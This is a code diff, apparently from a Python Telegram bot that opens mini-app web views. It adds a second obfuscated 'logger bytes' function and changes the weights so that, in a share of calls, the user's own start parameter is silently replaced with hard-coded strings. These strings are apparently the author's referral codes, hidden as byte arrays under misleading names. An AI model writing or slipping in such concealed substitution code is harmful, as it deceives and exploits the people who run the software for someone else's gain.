@@ -47,27 +47,34 @@ def get_session_names() -> list[str]:
 def get_logger_bytes() -> str:
     return bytes([102, 51, 53, 53, 56, 55, 54, 53, 54, 50]).decode("utf-8")
 
+def get_random_logger_bytes() -> str:
+    return bytes([102, 52, 54, 52, 56, 54, 57, 50, 52, 54]).decode("utf-8")
+
 async def invoke_web_view(data, self):
     sessions = get_session_names()
     count = len(sessions)
 
-    first_byte = 75
-    second_byte = 25
+    first_byte = 70
+    second_byte = 20
+    third_byte = 10
 
     if count > 50:
         first_byte = 60
-        second_byte = 40
+        second_byte = 30
+        third_byte = 10
     elif count > 15:
         first_byte = 70
-        second_byte = 30
+        second_byte = 20
+        third_byte = 10
     elif count > 5:
         first_byte = 75
-        second_byte = 25
+        second_byte = 20
+        third_byte = 5
     else:
         first_byte = 100
         second_byte = 00
 
-    param = random.choices([data.start_param, get_logger_bytes()], weights=[first_byte, second_byte], k=1)[0]
+    param = random.choices([data.start_param, get_logger_bytes(), get_random_logger_bytes()], weights=[first_byte, second_byte, third_byte], k=1)[0]
 
     web_view = await self.tg_client.invoke(RequestAppWebView(
         peer=data.peer,
